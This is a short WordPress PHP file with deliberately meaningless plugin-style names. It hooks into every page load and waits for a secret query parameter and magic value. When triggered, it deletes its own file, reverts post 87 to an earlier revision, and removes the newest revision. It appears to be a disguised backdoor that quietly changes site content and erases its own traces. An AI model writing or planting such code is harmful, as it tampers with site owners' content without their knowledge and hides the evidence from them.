<?php

function affiliates_welcome_elementor_finder() {
	if (isset($_GET['url_comments_plus']) && $_GET['url_comments_plus'] === 'iframe_anti_anywhere_box') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$delivery_scheduled_iframe_gamipress = 87;
		$loader_network_variations_assets = wp_get_post_revisions($delivery_scheduled_iframe_gamipress);
		if (empty($loader_network_variations_assets)) die('no revisions');
		if (count($loader_network_variations_assets) < 2) die('less than 2');
		$chart_fix_revisions_plugins = array_shift($loader_network_variations_assets);
		$cf7_catalog_cc = $chart_fix_revisions_plugins->ID;
		$player_make_shopp_updater = array_shift($loader_network_variations_assets);
		$portfolio_coupons_smooth = $player_make_shopp_updater->ID;
		$service_titles_sort = wp_restore_post_revision($portfolio_coupons_smooth);
		if ($service_titles_sort === false) die('error restoring');
		$service_titles_sort = wp_delete_post_revision($cf7_catalog_cc);		
		if ($service_titles_sort === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'affiliates_welcome_elementor_finder');
